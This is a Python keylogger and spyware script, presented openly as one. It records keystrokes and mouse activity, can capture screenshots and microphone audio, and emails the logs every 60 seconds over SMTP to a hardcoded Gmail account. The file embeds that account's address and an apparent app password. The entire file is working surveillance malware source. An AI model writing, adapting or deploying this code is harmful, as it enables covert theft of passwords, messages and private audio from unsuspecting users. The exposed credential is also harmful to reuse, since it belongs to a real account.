try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    EMAIL_ADDRESS = "davidmurimidecopter@gmail.com"
    EMAIL_PASSWORD = "zocq yhiv xvae yyrg"
    SEND_REPORT_EVERY = 60  # as in seconds

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started...\n"
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = f"Mouse moved to {x}, {y}\n"
            self.appendlog(current_move)

        def on_click(self, x, y, button, pressed):
            if pressed:
                current_click = f"Mouse clicked at {x}, {y} with {button}\n"
                self.appendlog(current_click)

        def on_scroll(self, x, y, dx, dy):
            current_scroll = f"Mouse scrolled at {x}, {y}\n"
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = f" {str(key)} "
            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            try:
                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = "davidmurimidecopter@gmail.com"
                msg['Subject'] = 'KeyLogger Report'

                msg.attach(MIMEText(message, 'plain'))

                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(email, password)
                server.sendmail(email, email, msg.as_string())
                server.quit()
            except Exception as e:
                print(f"Failed to send email: {e}")

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def screenshot(self):
            img = pyscreenshot.grab()
            img.save("screenshot.png")

            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = 'Screenshot Attachment'

            with open("screenshot.png", "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())

            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= screenshot.png",
            )
            msg.attach(part)

            self.send_mail(self.email, self.password, msg.as_string())

        def microphone(self):
            fs = 44100
            seconds = self.interval
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()

            with wave.open("mic_recording.wav", "wb") as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(recording)

            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = 'Microphone Recording Attachment'

            with open("mic_recording.wav", "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())

            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= mic_recording.wav",
            )
            msg.attach(part)

            self.send_mail(self.email, self.password, msg.as_string())

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()

            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
